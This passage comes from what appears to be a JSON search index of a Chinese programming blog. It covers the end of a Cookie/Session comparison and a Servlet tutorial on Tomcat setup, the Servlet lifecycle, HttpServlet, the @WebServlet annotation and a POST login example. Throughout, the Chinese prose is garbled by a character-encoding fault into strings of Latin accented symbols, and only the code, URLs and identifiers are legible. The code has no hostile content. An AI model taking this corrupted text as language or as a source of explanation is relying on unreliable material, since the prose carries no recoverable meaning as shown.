æœ‰é™åˆ¶   | æ— é™åˆ¶     |\n| è·¨åŸŸæ”¯æŒ | æ”¯æŒ     | ä¸æ”¯æŒ     |\n| å­˜å‚¨ä¿¡æ¯ | ä¸åŠ å¯†   | åŠ å¯†       |\n| ç”Ÿå‘½å‘¨æœŸ | å¯è‡ªå®šä¹‰ | ä¸å¯è‡ªå®šä¹‰ |\n\n## é¢è¯•é¢˜\n\n### å¦‚æœæ²¡æœ‰ Cookie çš„è¯ Session è¿˜èƒ½ç”¨å—ï¼Ÿ\n\nä¸€èˆ¬æ˜¯é€šè¿‡ `Cookie` æ¥ä¿å­˜ `SessionID` ï¼Œå‡å¦‚ä½ ä½¿ç”¨äº† `Cookie` ä¿å­˜ `SessionID` çš„æ–¹æ¡ˆçš„è¯ï¼Œ å¦‚æœå®¢æˆ·ç«¯ç¦ç”¨äº† `Cookie`ï¼Œé‚£ä¹ˆ `Session` å°±æ— æ³•æ­£å¸¸å·¥ä½œã€‚\n\nä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ²¡æœ‰ `Cookie` ä¹‹åå°±ä¸èƒ½ç”¨ `Session` äº†ï¼Œæ¯”å¦‚ä½ å¯ä»¥å°† `SessionID` æ”¾åœ¨è¯·æ±‚çš„ `url` é‡Œé¢`https://javaguide.cn/?Session_id=xxx` ã€‚è¿™ç§æ–¹æ¡ˆçš„è¯å¯è¡Œï¼Œä½†æ˜¯å®‰å…¨æ€§å’Œç”¨æˆ·ä½“éªŒæ„Ÿé™ä½ã€‚å½“ç„¶ï¼Œä¸ºäº†ä½ ä¹Ÿå¯ä»¥å¯¹ `SessionID` è¿›è¡Œä¸€æ¬¡åŠ å¯†ä¹‹åå†ä¼ å…¥åç«¯ã€‚\n\n## å‚è€ƒ\n\n- [è®¤è¯†HTTP----Cookieå’ŒSessionç¯‡ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/27669892)\n- ã€Šå›¾è§£HTTPã€‹\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["HTTP"],"categories":["JavaWeb"]},{"title":"Servlet","url":"/posts/55715.html","content":"\n## å‡†å¤‡å·¥ä½œ\n\n### Tomcat\n\nTomcat å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ Web åº”ç”¨æœåŠ¡å™¨è½¯ä»¶ï¼Œé€šè¿‡è¿è¡Œ Tomcat æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¿«é€Ÿéƒ¨ç½²æˆ‘ä»¬çš„ Web é¡¹ç›®ï¼Œå¹¶äº¤ç”± Tomcat è¿›è¡Œç®¡ç†ï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„é¡¹ç›®å³å¯ã€‚\n\n#### å®‰è£…Tomcat\n\nä¸‹è½½åœ°å€ï¼šhttps://tomcat.apache.org/download-10.cgi\n\n- ç‚¹å‡»å·¦ä¾§çš„downloadsï¼Œé€‰æ‹©å¯¹åº”çš„ç‰ˆæœ¬\n\n- ä¸‹è½½å®Œæˆåï¼Œè§£å‹ï¼Œæˆ‘æ”¾åˆ°äº†`opt/`ç›®å½•ä¸‹\n\n#### å¯åŠ¨Tomcat\n\n1. æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œå‘½ä»¤`cd /opt/apache-tomcat-10.0.20/bin`ï¼Œè¿›å…¥åˆ°tomcatçš„binç›®å½•ä¸‹\n2. è¾“å…¥ï¼š`./startup.sh` + å›è½¦\n   - å¦‚å‡ºç°é”™è¯¯ï¼šâ€œPermission deniedâ€ ï¼Œèµ‹äºˆè¶…çº§ç®¡ç†å‘˜æƒé™`sudo chmod 755 *.sh` \n   - å¦‚æœå‡ºç°ä¹±ç ï¼Œè¯´æ˜ç¼–ç æ ¼å¼é…ç½®æœ‰é—®é¢˜ï¼Œæ‰“å¼€`conf`æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ° `logging.properties`æ–‡ä»¶ï¼Œå°†ConsoleHandlerçš„é»˜è®¤ç¼–ç æ ¼å¼ä¿®æ”¹ä¸ºGBKç¼–ç æ ¼å¼ï¼š`java.util.logging.ConsoleHandler.encoding = GBK`\n\n3. æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥ç½‘å€ http://localhost:8080/ï¼Œå¦‚æœå‡ºç°ä¸€åªä¸‰è§’çŒ«ï¼Œè¡¨ç¤ºtomcatå®‰è£…æˆåŠŸ\n\n4. å…³é—­Tomcatï¼šåœ¨binç›®å½•ä¸‹ï¼Œç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼š`./shutdown.sh` \n\n#### Tomcatç›®å½•\n\n```bash\n$ tree -L 1\n.\nâ”œâ”€â”€ bin\nâ”œâ”€â”€ conf\nâ”œâ”€â”€ lib\nâ”œâ”€â”€ logs\nâ”œâ”€â”€ temp\nâ”œâ”€â”€ webapps\nâ””â”€â”€ work\n```\n\n- binç›®å½•ï¼šæ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒåŒ…æ‹¬å¯åŠ¨å’Œå…³é—­æœåŠ¡å™¨çš„è„šæœ¬\n- confç›®å½•ï¼šæœåŠ¡å™¨é…ç½®æ–‡ä»¶ç›®å½•\n\n* libç›®å½•ï¼šTomcatæœåŠ¡ç«¯è¿è¡Œçš„ä¸€äº›ä¾èµ–\n* logsç›®å½•ï¼šæ‰€æœ‰çš„æ—¥å¿—ä¿¡æ¯éƒ½åœ¨è¿™é‡Œ\n* tempç›®å½•ï¼šå­˜æ”¾è¿è¡Œæ—¶äº§ç”Ÿçš„ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œä¸ç”¨å…³å¿ƒ\n* workç›®å½•ï¼šå·¥ä½œç›®å½•ï¼ŒTomcatä¼šå°†jspæ–‡ä»¶è½¬æ¢ä¸ºjavaæ–‡ä»¶\n* webappsç›®å½•ï¼šæ‰€æœ‰çš„Webé¡¹ç›®éƒ½åœ¨è¿™é‡Œï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹éƒ½æ˜¯ä¸€ä¸ªWebåº”ç”¨ç¨‹åºï¼š\n\næˆ‘ä»¬å‘ç°ï¼Œå®˜æ–¹å·²ç»ç»™æˆ‘ä»¬é¢„è®¾äº†ä¸€äº›é¡¹ç›®äº†ï¼Œè®¿é—®åé»˜è®¤ä½¿ç”¨çš„é¡¹ç›®ä¸ºROOTé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é»˜è®¤æ‰“å¼€çš„ç½‘ç«™ã€‚\n\nTomcatè¿˜è‡ªå¸¦ç®¡ç†é¡µé¢ï¼Œæˆ‘ä»¬æ‰“å¼€ï¼šhttp://localhost:8080/managerï¼Œæç¤ºéœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œ\n\néœ€è¦å…ˆå»`conf/tomcat-users.xml`é…ç½®ç”¨æˆ·åå’Œå¯†ç \n\n```xml\n<role rolename=\"manager-gui\"/>\n<user username=\"admin\" password=\"password\" roles=\"manager-gui\"/>\n```\n\nç°åœ¨å†æ¬¡æ‰“å¼€ç®¡ç†é¡µé¢ï¼Œå·²ç»å¯ä»¥æˆåŠŸä½¿ç”¨æ­¤ç”¨æˆ·è¿›è¡Œç™»é™†äº†ã€‚ç™»å½•åï¼Œå±•ç¤ºç»™æˆ‘ä»¬çš„æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿé¢„è§ˆå½“å‰æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ï¼ŒåŒ…æ‹¬å·²ç»åœ¨è¿è¡Œçš„Webåº”ç”¨ç¨‹åºï¼Œç”šè‡³è¿˜å¯ä»¥æŸ¥çœ‹å½“å‰çš„Webåº”ç”¨ç¨‹åºæœ‰æ²¡æœ‰å‡ºç°å†…å­˜æ³„éœ²ã€‚è¿˜æœ‰ä¸€ä¸ªè™šæ‹Ÿä¸»æœºç®¡ç†é¡µé¢ï¼Œç”¨äºä¸€å°ä¸»æœºæ­å»ºå¤šä¸ªWebç«™ç‚¹\n\n### Mavenåˆ›å»ºWebé¡¹ç›®\n\n- 1ã€æ‰“å¼€IDEAï¼Œæ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œé€‰æ‹© Java Enterpriseï¼ˆç¤¾åŒºç‰ˆæ²¡æœ‰æ­¤é€‰é¡¹ï¼‰\n- 2ã€é¡¹ç›®æ¨¡æ¿é€‰æ‹©Webåº”ç”¨ç¨‹åº\n- 3ã€ç„¶åéœ€è¦é…ç½®Webåº”ç”¨ç¨‹åºæœåŠ¡å™¨ï¼Œå°†å‰é¢ä¸‹è½½çš„TomcatæœåŠ¡å™¨é›†æˆåˆ°IDEAä¸­ã€‚\n  - é¦–å…ˆç‚¹å‡»æ–°å»ºï¼Œç„¶åè®¾ç½®Tomcatä¸»ç›®å½•å³å¯ï¼Œé…ç½®å®Œæˆåï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥å³å¯ï¼Œä¾èµ–é¡¹ä½¿ç”¨é»˜è®¤å³å¯ï¼Œç„¶åç‚¹å‡»å®Œæˆï¼Œä¹‹åIDEAä¼šè‡ªåŠ¨å¸®åŠ©æˆ‘ä»¬åˆ›å»ºMavené¡¹ç›®ã€‚\n\n- 4ã€åˆ›å»ºå®Œæˆåï¼Œç›´æ¥ç‚¹å‡»å³ä¸Šè§’å³å¯è¿è¡Œæ­¤é¡¹ç›®äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œæœ‰ä¸€ä¸ªServleté¡µé¢ä¸ç”Ÿæ•ˆã€‚å› ä¸º Tomcat 10 ä»¥ä¸Šçš„ç‰ˆæœ¬æ¯”è¾ƒæ–°ï¼ŒServlet APIåŒ…åå‘ç”Ÿäº†ä¸€äº›å˜åŒ–\n  - å› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹ä¾èµ–\n  - åŒ…åä¹Ÿéœ€è¦å…¨éƒ¨ä» `javax` æ”¹ä¸º `jakarta` ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹ã€‚\n\n```xml\n<dependency>\n    <groupId>jakarta.servlet</groupId>\n    <artifactId>jakarta.servlet-api</artifactId>\n    <version>5.0.0</version>\n    <scope>provided</scope>\n</dependency>\n```\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨Maven çš„ package å‘½ä»¤å°†é¡¹ç›®ç›´æ¥æ‰“åŒ…ä¸ºwaråŒ…ï¼ˆé»˜è®¤ï¼‰ï¼Œé»˜è®¤åœ¨é¡¹ç›®çš„targetç›®å½•ä¸‹ï¼Œç„¶åæ”¾å…¥webappæ–‡ä»¶å¤¹ï¼Œå°±å¯ä»¥ç›´æ¥è¿è¡Œæˆ‘ä»¬é€šè¿‡Javaç¼–å†™çš„Webåº”ç”¨ç¨‹åºäº†ï¼Œè®¿é—®è·¯å¾„ä¸ºæ–‡ä»¶çš„åç§°ã€‚\n\n## Servlet ç®€ä»‹\n\nServlet æ˜¯ Server Applet çš„ç¼©å†™ï¼Œè¯‘ä¸ºâ€œæœåŠ¡å™¨ç«¯å°ç¨‹åºâ€ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨ Java è¯­è¨€æ¥å¼€å‘åŠ¨æ€ç½‘ç«™çš„æŠ€æœ¯ã€‚\n\nServlet æ˜¯ Java EE çš„ä¸€ä¸ªæ ‡å‡†ï¼Œå¤§éƒ¨åˆ†çš„ Web æœåŠ¡å™¨éƒ½æ”¯æŒæ­¤æ ‡å‡†ï¼ŒåŒ…æ‹¬ Tomcatï¼Œå°±åƒä¹‹å‰çš„JDBCä¸€æ ·ï¼Œç”±å®˜æ–¹å®šä¹‰äº†ä¸€ç³»åˆ—æ¥å£ï¼Œè€Œå…·ä½“å®ç°ç”±æˆ‘ä»¬æ¥ç¼–å†™ï¼Œæœ€åäº¤ç»™WebæœåŠ¡å™¨ï¼ˆå¦‚Tomcatï¼‰æ¥è¿è¡Œæˆ‘ä»¬ç¼–å†™çš„Servletã€‚\n\n## åˆ›å»ºServlet\n\n### ä½¿ç”¨æ³¨è§£é…ç½®\n\nå¦‚ä½•åˆ›å»ºä¸€ä¸ªServletå‘¢ï¼Œåªéœ€è¦å®ç°`Servlet`ç±»å³å¯ï¼Œå¹¶æ·»åŠ æ³¨è§£`@WebServlet`æ¥è¿›è¡Œæ³¨å†Œã€‚\n\n```java\n@WebServlet(\"/test\")\npublic class TestServlet implements Servlet {\n\t\t...//å®ç°æ¥å£æ–¹æ³•\n}\n```\n\nç°åœ¨å°±å¯ä»¥è®¿é—®ä¸€ä¸‹æˆ‘ä»¬çš„é¡µé¢ï¼šhttp://localhost:8080/xxx/test\n\n### ä½¿ç”¨web.xmlé…ç½®\n\né™¤äº†ç›´æ¥ç¼–å†™ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨`web.xml`ä¸­è¿›è¡Œæ³¨å†Œï¼Œç°å°†ç±»ä¸Š`@WebServlet`çš„æ³¨è§£å»æ‰ï¼š\n\n```xml\n<servlet>\n    <servlet-name>test</servlet-name>\n    <servlet-class>com.example.webtest.TestServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>test</servlet-name>\n    <url-pattern>/test</url-pattern>\n</servlet-mapping>\n```\n\nè¿™æ ·çš„æ–¹å¼ä¹Ÿèƒ½æ³¨å†ŒServletï¼Œä½†æ˜¯æ˜¾ç„¶ç›´æ¥ä½¿ç”¨æ³¨è§£æ›´åŠ æ–¹ä¾¿ï¼Œå› æ­¤ä¹‹åæˆ‘ä»¬ä¸€å¾‹ä½¿ç”¨æ³¨è§£è¿›è¡Œå¼€å‘ã€‚\n\n## Servletç”Ÿå‘½å‘¨æœŸ\n\næ¥ç€æ¥çœ‹çœ‹ï¼Œä¸€ä¸ªServletæ˜¯å¦‚ä½•è¿è¡Œçš„ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ï¼ŒServletä¸­çš„æ–¹æ³•å„è‡ªæ˜¯åœ¨ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨çš„ï¼Œæˆ‘ä»¬å…ˆç¼–å†™ä¸€ä¸ªæ‰“å°è¯­å¥æ¥çœ‹çœ‹\n\n```java\npublic class TestServlet implements Servlet {\n\n    public TestServlet(){\n        System.out.println(\"æˆ‘æ˜¯æ„é€ æ–¹æ³•ï¼\");\n    }\n\n    @Override\n    public void init(ServletConfig servletConfig) throws ServletException {\n        System.out.println(\"æˆ‘æ˜¯init\");\n    }\n\n    @Override\n    public ServletConfig getServletConfig() {\n        System.out.println(\"æˆ‘æ˜¯getServletConfig\");\n        return null;\n    }\n\n    @Override\n    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {\n        System.out.println(\"æˆ‘æ˜¯service\");\n    }\n\n    @Override\n    public String getServletInfo() {\n        System.out.println(\"æˆ‘æ˜¯getServletInfo\");\n        return null;\n    }\n\n    @Override\n    public void destroy() {\n        System.out.println(\"æˆ‘æ˜¯destroy\");\n    }\n}\n```\n\næˆ‘ä»¬é¦–å…ˆå¯åŠ¨ä¸€æ¬¡æœåŠ¡å™¨ï¼Œç„¶åè®¿é—®æˆ‘ä»¬å®šä¹‰çš„é¡µé¢ï¼Œç„¶åå†å…³é—­æœåŠ¡å™¨ï¼Œå¾—åˆ°å¦‚ä¸‹çš„é¡ºåºï¼š\n\n```\næˆ‘æ˜¯æ„é€ æ–¹æ³•ï¼\næˆ‘æ˜¯init\næˆ‘æ˜¯service\n\næˆ‘æ˜¯destroy\n```\n\næˆ‘ä»¬å¯ä»¥å¤šæ¬¡å°è¯•å»è®¿é—®æ­¤é¡µé¢ï¼Œä½†æ˜¯`init`å’Œ`æ„é€ æ–¹æ³•`åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œæ¯æ¬¡è®¿é—®éƒ½ä¼šæ‰§è¡Œçš„æ˜¯`service`æ–¹æ³•ï¼Œå› æ­¤ï¼Œä¸€ä¸ªServletçš„ç”Ÿå‘½å‘¨æœŸä¸ºï¼š\n\n- é¦–å…ˆæ‰§è¡Œæ„é€ æ–¹æ³•å®Œæˆ Servlet åˆå§‹åŒ–\n- Servlet åˆå§‹åŒ–åè°ƒç”¨ **init ()** æ–¹æ³•\n- Servlet è°ƒç”¨ **service()** æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚\n- Servlet é”€æ¯å‰è°ƒç”¨ **destroy()** æ–¹æ³•\n- æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚\n\n![Servlet ç”Ÿå‘½å‘¨æœŸ](https://img.jwt1399.top/img/14224J192-0.png)\n\nåœ¨Webåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæ¯å½“æµè§ˆå™¨å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä¸€æ¬¡`service`æ–¹æ³•ï¼Œæ¥è®©æˆ‘ä»¬å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶å°†ç»“æœå“åº”ç»™ç”¨æˆ·ã€‚\n\n`service`æ–¹æ³•ä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œ`ServletRequest`å’Œ`ServletResponse`ï¼Œå®é™…ä¸Šï¼Œç”¨æˆ·å‘èµ·çš„HTTPè¯·æ±‚ï¼Œå°±è¢«TomcatæœåŠ¡å™¨å°è£…ä¸ºäº†ä¸€ä¸ª`ServletRequest`å¯¹è±¡ï¼Œæˆ‘ä»¬å¾—åˆ°æ˜¯å…¶å®æ˜¯TomcatæœåŠ¡å™¨å¸®åŠ©æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå®ç°ç±»ï¼ŒHTTPè¯·æ±‚æŠ¥æ–‡ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œéƒ½å¯ä»¥ä»`ServletRequest`å¯¹è±¡ä¸­è·å–ï¼ŒåŒç†ï¼Œ`ServletResponse`å°±æ˜¯æˆ‘ä»¬éœ€è¦è¿”å›ç»™æµè§ˆå™¨çš„HTTPå“åº”æŠ¥æ–‡å®ä½“ç±»å°è£…ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹`ServletRequest`ä¸­æœ‰å“ªäº›å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è·å–è¯·æ±‚çš„ä¸€äº›ä¿¡æ¯ï¼š\n\n```java\n@Override\npublic void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {\n    //é¦–å…ˆå°†å…¶è½¬æ¢ä¸ºHttpServletRequestï¼ˆç»§æ‰¿è‡ªServletRequestï¼Œä¸€èˆ¬æ˜¯æ­¤æ¥å£å®ç°ï¼‰\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        \n        System.out.println(request.getProtocol());  //è·å–åè®®ç‰ˆæœ¬\n        System.out.println(request.getRemoteAddr());  //è·å–è®¿é—®è€…çš„IPåœ°å€\n  \t\t  System.out.println(request.getMethod());   //è·å–è¯·æ±‚æ–¹æ³•\n        //è·å–å¤´éƒ¨ä¿¡æ¯\n        Enumeration<String> enumeration = request.getHeaderNames();\n        while (enumeration.hasMoreElements()){\n            String name = enumeration.nextElement();\n            System.out.println(name + \": \" + request.getHeader(name));\n        }\n}\n```\n\næˆ‘ä»¬å‘ç°ï¼Œæ•´ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œéƒ½å¯ä»¥é€šè¿‡`HttpServletRequest`å¯¹è±¡æ¥è·å–ï¼Œå½“ç„¶ï¼Œå®ƒçš„ä½œç”¨è‚¯å®šä¸ä»…ä»…æ˜¯è·å–å¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å®ƒæ¥å®Œæˆæ›´å¤šæ“ä½œ\n\nå†æ¥çœ‹çœ‹`ServletResponse`ï¼Œè¿™ä¸ªæ˜¯æœåŠ¡ç«¯çš„å“åº”å†…å®¹ï¼Œå¡«å†™æƒ³è¦å‘é€ç»™æµè§ˆå™¨æ˜¾ç¤ºçš„å†…å®¹ï¼š\n\n```java\n//è½¬æ¢ä¸ºHttpServletResponseï¼ˆåŒä¸Šï¼‰\nHttpServletResponse response = (HttpServletResponse) servletResponse;\n//è®¾å®šå†…å®¹ç±»å‹ä»¥åŠç¼–ç æ ¼å¼ï¼ˆæ™®é€šHTMLæ–‡æœ¬ä½¿ç”¨text/htmlï¼Œä¹‹åä¼šè®²è§£æ–‡ä»¶ä¼ è¾“ï¼‰\nresponse.setHeader(\"Content-type\", \"text/html;charset=UTF-8\");\n//è·å–Writerç›´æ¥å†™å…¥å†…å®¹\nresponse.getWriter().write(\"æˆ‘æ˜¯å“åº”å†…å®¹ï¼\");\n//æ‰€æœ‰å†…å®¹å†™å…¥å®Œæˆä¹‹åï¼Œå†å‘é€ç»™æµè§ˆå™¨\n```\n\nç°åœ¨æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æ­¤é¡µé¢ï¼Œå°±èƒ½å¤Ÿæ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„å“åº”å†…å®¹äº†ã€‚å…¶ä¸­ï¼Œå“åº”å¤´éƒ¨åˆ†ï¼Œæ˜¯ç”±Tomcatå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆçš„ä¸€ä¸ªé»˜è®¤å“åº”å¤´ã€‚\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fwww.qingruanit.net%252FcatchImages%252F20170218%252F1487385940733020268.png&refer=http%253A%252F%252Fwww.qingruanit.jpeg)\n\n## HttpServlet\n\n```java\npublic abstract class GenericServlet implements Servlet {}\npublic abstract class HttpServlet extends GenericServlet {}\n```\n\n- HttpServlet ç»§æ‰¿è‡ª GenericServlet ç±»\n- GenericServlet å®ç°äº† Servlet æ¥å£\n\n`Servlet`æœ‰ä¸€ä¸ªç›´æ¥å®ç°æŠ½è±¡ç±»`GenericServlet`ï¼Œè¿™ä¸ªç±»å®Œå–„äº†é…ç½®æ–‡ä»¶è¯»å–å’ŒServletä¿¡æ¯ç›¸å…³çš„çš„æ“ä½œï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰å»å®ç°serviceæ–¹æ³•\n\n`HttpServlet`ï¼Œå®ƒæ˜¯éµå¾ªHTTPåè®®çš„ä¸€ç§Servletï¼Œç»§æ‰¿è‡ª`GenericServlet`ï¼Œå®ƒæ ¹æ®HTTPåè®®çš„è§„åˆ™ï¼Œå®Œå–„äº†serviceæ–¹æ³•ã€‚\n\nå› æ­¤åªéœ€è¦ç»§æ‰¿ HttpServlet å°±å¯ä»¥ç¼–å†™æˆ‘ä»¬çš„ Servlet äº†ï¼Œå¹¶ä¸”å®ƒå·²ç»å¸®åŠ©æˆ‘ä»¬æå‰å®ç°äº†ä¸€äº›æ“ä½œï¼Œè¿™æ ·å°±ä¼šç»™æˆ‘ä»¬çœå»å¾ˆå¤šçš„æ—¶é—´ã€‚\n\n```java\n@WebServlet(\"/test\")\npublic class TestServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(\"<h1>æµ‹è¯•ä¸€ä¸‹ä¸‹</h1>\");\n    }\n}\n```\n\n## @WebServletæ³¨è§£\n\nå¯ä»¥ç›´æ¥ä½¿ç”¨ WebServlet æ³¨è§£æ¥å¿«é€Ÿæ³¨å†Œä¸€ä¸ª Servlet\n\n| å±æ€§å         | ç±»å‹            | æè¿°                                                         | å¿…éœ€ |\n| -------------- | --------------- | ------------------------------------------------------------ | ---- |\n| name           | String          | æŒ‡å®š Servlet çš„ name å±æ€§ã€‚ å¦‚æœæ²¡æœ‰æ˜¾å¼æŒ‡å®šï¼Œåˆ™å–å€¼ä¸ºè¯¥ Servlet çš„å®Œå…¨é™å®šåï¼Œå³åŒ…å+ç±»åã€‚ | å¦   |\n| value          | String[ ]       | è¯¥å±æ€§ç­‰ä»·äº urlPatterns å±æ€§ï¼Œä¸¤è€…ä¸èƒ½åŒæ—¶æŒ‡å®šã€‚ å¦‚æœåŒæ—¶æŒ‡å®šï¼Œé€šå¸¸æ˜¯å¿½ç•¥ value çš„å–å€¼ã€‚ | æ˜¯   |\n| urlPatterns    | String[ ]       | ä»£è¡¨å½“å‰Servletçš„è®¿é—®è·¯å¾„ã€‚                                  | æ˜¯   |\n| loadOnStartup  | int             | æŒ‡å®š Servlet çš„åŠ è½½é¡ºåºã€‚                                    | å¦   |\n| initParams     | WebInitParam[ ] | æŒ‡å®šä¸€ç»„ Servlet åˆå§‹åŒ–å‚æ•°ã€‚                                | å¦   |\n| asyncSupported | boolean         | å£°æ˜ Servlet æ˜¯å¦æ”¯æŒå¼‚æ­¥æ“ä½œæ¨¡å¼ã€‚                          | å¦   |\n| description    | String          | æŒ‡å®šè¯¥ Servlet çš„æè¿°ä¿¡æ¯ã€‚                                  | å¦   |\n| displayName    | String          | æŒ‡å®šè¯¥ Servlet çš„æ˜¾ç¤ºåã€‚                                    | å¦   |\n\n```java\n@WebServlet(urlPatterns = \"/test/*\")\n//å¯çœç•¥urlPatterns\n@WebServlet(\"/test/*\")\n```\n\nä¸Šé¢çš„è·¯å¾„è¡¨ç¤ºï¼Œæ‰€æœ‰åŒ¹é…`/test/éšä¾¿ä»€ä¹ˆ`çš„è·¯å¾„åç§°ï¼Œéƒ½å¯ä»¥è®¿é—®æ­¤Servlet\n\nä¹Ÿå¯ä»¥è¿›è¡ŒæŸä¸ªæ‰©å±•åç§°çš„åŒ¹é…ï¼š\n\n```java\n@WebServlet(\"*.js\")\n```\n\nè¿™æ ·çš„è¯ï¼Œè·å–ä»»ä½•ä»¥jsç»“å°¾çš„æ–‡ä»¶ï¼Œéƒ½ä¼šç”±æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„Servletå¤„ç†ã€‚\n\nè¿˜å¯ä»¥ä¸ºä¸€ä¸ªServleté…ç½®å¤šä¸ªè®¿é—®è·¯å¾„ï¼š\n\n```java\n@WebServlet({\"/test1\", \"/test2\"})\n```\n\næ¥ç€çœ‹ loadOnStartup å±æ€§ï¼Œæ­¤å±æ€§å†³å®šäº†æ˜¯å¦åœ¨Tomcatå¯åŠ¨æ—¶å°±åŠ è½½æ­¤Servletï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒServletåªæœ‰åœ¨è¢«è®¿é—®æ—¶æ‰ä¼šåŠ è½½ï¼Œå®ƒçš„é»˜è®¤å€¼ä¸º-1ï¼Œè¡¨ç¤ºä¸åœ¨å¯åŠ¨æ—¶åŠ è½½ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¿®æ”¹ä¸ºå¤§äºç­‰äº0çš„æ•°ï¼Œæ¥å¼€å¯å¯åŠ¨æ—¶åŠ è½½ã€‚å¹¶ä¸”æ•°å­—çš„å¤§å°å†³å®šäº†æ­¤Servletçš„å¯åŠ¨ä¼˜å…ˆçº§ã€‚\n\n```java\n@Log\n@WebServlet(value = \"/test\", loadOnStartup = 1)\npublic class TestServlet extends HttpServlet {\n\n    @Override\n    public void init() throws ServletException {\n        super.init();\n        log.info(\"æˆ‘è¢«åˆå§‹åŒ–äº†ï¼\");\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(\"<h1>æ­å–œä½ è§£é”äº†å…¨æ–°ç©æ³•</h1>\");\n    }\n}\n```\n\n## POSTè¯·æ±‚å®Œæˆç™»å½•\n\nåˆ›å»ºä¸€ä¸ª Servletï¼Œè®©å…¶èƒ½å¤Ÿæ¥æ”¶ä¸€ä¸ª POST è¯·æ±‚ï¼š\n\n```java\n@WebServlet(\"/login\")\npublic class LoginServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        req.getParameterMap().forEach((k, v) -> {\n            System.out.println(k + \": \" + Arrays.toString(v));\n        });\n    